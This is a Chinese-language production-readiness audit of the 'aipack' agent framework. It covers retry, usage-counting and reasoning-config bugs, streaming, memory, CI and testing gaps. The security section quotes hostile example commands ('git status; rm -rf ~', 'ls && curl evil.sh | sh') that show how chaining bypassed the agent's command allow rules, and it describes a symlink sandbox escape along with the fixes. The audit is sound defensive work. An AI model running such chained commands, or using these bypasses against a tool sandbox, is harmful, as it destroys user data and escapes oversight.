# aipack 生产级评估报告

> 评估范围：核心包 `packages/aipack` + 子包（compression/memory/coding/cli）+ 应用示例 + 工程配置 + 测试。
> 评估日期：2026-08-10
> 目标：达到生产级别 Agent 框架。

---

## 一、总体评价

架构设计是**加分项**：`Runtime + Extension(Tapable) + Transformer(Pipeline)` 三层模型清晰、开闭原则贯彻得好；会话串行队列、原子写、工具配对修复、五级压缩降级、BM25+向量混合检索、KeyedMutex 并发控制等细节体现了很强的工程意识。核心调度（`packages/aipack/runtime/index.ts`）质量在同类自研框架中属上乘。

**但距离"生产级别"还有明显差距**，主要集中在三块：① AI 层存在几个"声明了但不生效"的正确性 Bug；② 安全边界（coding 包）有可被利用的绕过；③ 可观测性、发布工程化、CI 完全缺失。当前版本更适合定位 **v0.1 内部可用**。

---

## 二、P0 级问题（必须修复，直接影响正确性/资金）

### 1. HTTP 429/5xx 重试实际从不生效，且错误信息损坏

`packages/aipack/ai/stream-openai.ts` 在 `!res.ok && isRetryableHttpStatus(res.status)` 时 **`throw res`（抛出 Response 对象）**，而 `packages/aipack/ai/retry.ts` 的 `isRetryableError` 把非数字错误交给 `isRetryableNetworkError`：`String(Response)` = `"[object Response]"`，不匹配任何模式 → **一次都不重试**。附带：错误消息变成 `API error 429: [object ReadableStream]`，且响应体从未被消费（连接泄漏）。compression 包的 `retry.ts` 已正确检查 `err.status`，核心包反而漏了。

### 2. `setThinkingLevel()` 链路断裂，配置完全无效

`packages/aipack/runtime/index.ts` 经 `StreamOptions.reasoning` 传入，`packages/aipack/adapters/ai.ts` 却把它写进 `merged.reasoningEffort`；而 stream 实现读取的是 `options.reasoning`（`stream-openai.ts`、`stream-anthropic.ts`）。`reasoningEffort` 在生产代码中无任何消费者 → 用户配置的思考级别对模型完全无效，且无任何报错。

### 3. OpenAI 路径 `usage.total` 恒为 0

`packages/aipack/ai/stream-openai.ts` 的 `buildUsage` 设置了 `totalTokens` 却未设置 `total`；runtime 的 `sumUsage/buildResult` 累加的都是 `u.total` → 所有 OpenAI 兼容 provider 的 token 统计、成本、会话持久化数据全部失真。

### 4. 安全：命令串联绕过权限检查 + symlink 逃逸沙箱（✅ 已修复，见 Phase 3-3）

- `packages/aipack-coding/src/permission.ts` 的 allow 规则只锚定命令开头，而 `packages/aipack-coding/src/tools/run-command.ts` 用 `spawn(command, { shell: true })` → `git status; rm -rf ~`、`ls && curl evil.sh | sh` 先命中 allow，随后 shell 完整执行。**这是最危险的一条**。
- `packages/aipack-coding/src/utils/path.ts` 的 `resolveWithin` 只做字符串级 `..` 判断，不解析 symlink → workspace 内指向 `/etc` 的链接可越界读写。
- **修复**：run_command 改无 shell 执行（`parseCommandToArgv` + `spawn(..., { shell: false })`），多语句/管道/重定向/通配符一律拒绝；框架级 `PermissionPolicy` 在工具执行前统一裁决；`resolveWithin` 加 realpath 解析。

---

## 三、P1 级问题（健壮性/可靠性）

| 领域            | 问题                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| --------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | --- |
| **流式**        | 流循环无 `finally`/`reader.cancel()`，消费者中途 break 泄漏底层连接；**无 idle/总超时**，半开连接会永久挂起；SSE 解析不支持规范要求的 `\r\n\r\n` 终止符                                                                                                                                                                                                                                                                                  |
| **Anthropic**   | tool_use 参数 JSON 只用 `JSON.parse` 兜底，嵌套不完整片段会截断（OpenAI 路径已用 partial-json，两实现不一致）                                                                                                                                                                                                                                                                                                                            |
| **API Key**     | ✅ 已修复（Phase 3-4）：`resolveApiKey` 已统一至 `ai/credentials.ts`（apiKey > 注入 CredentialStore > 环境变量）；`Models.credentials` 接线进 `dispatchStream`，`createModels({ credentials })` 注入 KMS 真实生效；`getAuth()` 接入同一优先级链；env 变量名统一为约定名 `<PROVIDER>_API_KEY`（google 由 `GEMINI_API_KEY` 改为 `GOOGLE_API_KEY`，与 `getEnvApiKey`/`hasProviderConfigured` 一致，消除"探测有 key 实际解析失败"的 P1 bug） |
| **重试**        | `isRetryableNetworkError` 的 `'timeout'` 子串误匹配 abort 类错误 → 对非幂等 POST 可能重复计费；`retry` 循环结束可能抛 `undefined`                                                                                                                                                                                                                                                                                                        |
| **死代码**      | `diagnostics.ts`、`parseStreamingJson`（复制了一份在 stream 里）、`isContextOverflow`、`cacheWrite1h` 双倍计费分支全部未接线，维护认知负担重                                                                                                                                                                                                                                                                                             |
| **compression** | `compressionDepth` 跨 turn 累积且从不重置，与注释矛盾 → 运行几轮后 L2 永久失效；`telemetryHistory` 无限增长；L4 检查点经核心包 `resourceToMessage` 往返后丢失 `pinned/meta/type`，压缩保护语义失效                                                                                                                                                                                                                                       |
| **memory**      | `consolidator` **先删后存、非原子**，中途失败即丢记忆；BM25 raw 分与 0.85 阈值量纲不匹配，合并可能几乎不触发；capture/injection 依赖"单 Runtime 单会话"约定，无防御                                                                                                                                                                                                                                                                      |
| **cli**         | 配置优先级已修复（✅ `config.test.ts` 覆盖：全局 < 项目级 .json < 项目级 .js < env < CLI）；仍存：`replay` 会真实重放有副作用的工具；`process.exit()` 写进库代码 |

---

## 四、P2 级问题（工程化/可观测性/测试）

1. **可观测性缺失**：全仓库无 structured logging、无 tracing/metrics 接口，错误处理依赖 `console.warn/error`；压缩/记忆插件的遥测只是"shared Map 传值 + console"，且跨 session 串扰。
2. **静默吞错成风**：`persistSessionSafe`、memory touchRecall 磁盘失败、coding factory 的 memory import 失败、CLI `.env` 加载失败全部静默 → 线上排障困难。
3. **发布工程化**：无 `sideEffects: false`；仅 ESM 无 `require` 条件（未文档化）；双入口重复打包 ai 实现导致包体积翻倍；`engines >=18` 但 test script 需 Node 18.19+；`test/*.test.ts` 依赖 shell glob 非跨平台。
4. **无 CI/CD**：`.github` 目录不存在，无 lint/typecheck/test/build 流水线、无版本发布流程、无 CHANGELOG、无 LICENSE 文件（package.json 声称 MIT）。
5. **测试错位**：327 个用例大量覆盖了"生产未接线的死代码"，而 **stream 实现零测试**（P0-1/P0-3 因此漏网）、adapter 零测试（P0-2 漏网）、无超时/并发/SSE 异常用例；coding 权限测试漏掉最危险的串联/symlink；cli 包**完全零测试**；compression 的 `retry.test.ts` 写好了却没注册进 test script。

---

## 五、生产级改进路线图

### Phase 1 — 正确性修复（P0）

1. retry 支持 `err.status`/Response 对象 + stream catch 消费响应体
2. adapter 改透传 `merged.reasoning`
3. `buildUsage` 补 `usage.total`
4. coding 工具：禁用 shell 串联（参数数组 spawn 或命令级解析）+ 真实路径解析（`realpath`）防 symlink 逃逸

### Phase 2 — 流式与错误体系（P0/P1）

- stream 循环加 `try/finally` 释放 reader；内置 idle 超时（默认 60s）+ 总超时；SSE 兼容 `\r\n` 终止符；Anthropic 接入 partial-json
- 统一 `AgentError` 分类（Retryable/Timeout/Auth/ContextOverflow/RateLimit），去掉死代码分支

### Phase 3 — 生产级框架基础设施（"生产级"的核心）

1. **可观测性**：定义 `Telemetry` 接口（onRunStart/onToolCall/onModelCall/onTurn），核心 + 子包统一上报，提供 console/OpenTelemetry 实现
2. **多租户/并发** ✅ 已完成：`sessionKey` 从"每 Runtime 一个"提升为 SessionManager —— `Request.sessionKey` 路由 + AgentRuntime 内存会话状态表（Map）+ LRU 上限（`maxSessions`，默认 256），模型/工具/扩展/转换器跨会话共享，每会话独立消息/串行队列/abort/hydrated；新增 `SessionManager`/`createSessionManager` 门面与按会话粒度的 `getMessages/abort/isBusy/waitForIdle/clearSession/deleteSession`。**存储级锁** ✅ 已完成：`SessionStorage` 新增可选 `withLock`/`acquireLock`，`FileSessionStorage` 用 O_EXCL 锁文件实现跨进程互斥（指数退避重试 + `lockWaitMs` 超时 + `lockStaleMs` 陈旧锁回收），`MemorySessionStorage` 提供进程内 per-key 互斥；Runtime 在非 ephemeral 请求下对"读-改-写"全程持锁（含流式与 deleteSession），多进程并发写同一会话不再 last-write-wins 丢消息
3. **安全** ✅ 已完成（Phase 3-3 PermissionPolicy 安全层）：`Tool` 新增 `permissions` 能力声明（如 `shell:exec`/`fs:write`/`fs:read`，未声明视为安全），`RuntimeOptions.permissionPolicy` 可选注入框架级策略，`executeTool` 在 `prepareArguments` 之后、`beforeToolCall` 之前裁决——deny 产出 `details.blocked` 结果且不终止 run；内置 `createPermissionPolicy`（rule-based）/`createAllowListPolicy`/`createDenyAllPolicy`/`createAllowAllPolicy` 工厂与 `hasPermission` 前缀匹配，支持 `confirm` 钩子；未配置策略时全部放行（向后兼容，文档警示生产必须配置）；新增 `onPermissionDenied` 遥测。**run_command 改无 shell 执行**：`parseCommandToArgv` 解析 argv + `spawn(file, args, { shell: false })`，多语句（`;`/`&&`/`||`/换行）/管道/重定向/命令替换/未引用通配符一律拒绝并提示替代工具，前导 `NAME=value` 收集为 env，`~` 展开；`read_file` 等 6 个文件/命令工具声明权限能力。coding 包 `resolveWithin` 已加 realpath 解析防 symlink 逃逸
4. **配置与密钥** ✅ 已完成（Phase 3-4）：删除重复的 `resolveApiKey`，统一走 `CredentialStore`（默认 `EnvCredentialStore`，约定名 `<PROVIDER>_API_KEY`，可注入 KMS）；`Models` 注入的 credentials 已接线到实际请求；`getAuth` 与 `resolveApiKey` 优先级一致；env 变量名全部对齐约定名（google → `GOOGLE_API_KEY`，README/.env.example 同步）；CLI 配置优先级此前已修复并有 `config.test.ts` 覆盖
5. **CI/发布**：GitHub Actions（typecheck → test → build → lint）+ changesets + 版本发布；补 `sideEffects`、CJS 兼容声明或明确文档化 ESM-only

### Phase 4 — 测试补强

- 为 stream/adapter 补 mock-fetch 流式测试（UTF-8 跨 chunk、abort、断流、429/5xx、usage 尾块）
- 补 coding 安全用例（串联/symlink）✅ 已完成：tools.test.ts 新增无 shell（引号/env 前缀/多语句/管道/通配符/重定向）与 symlink 逃逸用例，permission.test.ts 新增 parseCommandToArgv 12 用例
- compression 的 compressionDepth 跨 turn 测试
- cli 配置优先级测试
